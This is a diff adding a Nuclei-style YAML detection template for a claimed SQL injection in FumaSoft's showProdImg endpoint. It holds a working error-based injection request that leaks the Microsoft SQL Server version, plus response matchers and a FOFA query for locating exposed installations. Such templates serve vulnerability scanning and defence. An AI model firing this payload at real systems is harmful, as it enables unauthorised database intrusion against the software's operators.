@@ -1,0 +1,35 @@
+id: poc-yaml-fumasoft-showprodimg-sqli
+info:
+  name: FumaSoft showProdImg SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: FumaCloud
+    fofa-query: app="FumaSoft"
+
+variables:
+  t1: "{{rand_int(1000, 100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Ajax/upload.ashx?action=showProdImg&FID=1')and%201<@@version-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "FumaCRM"
+          - "showProdImg"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
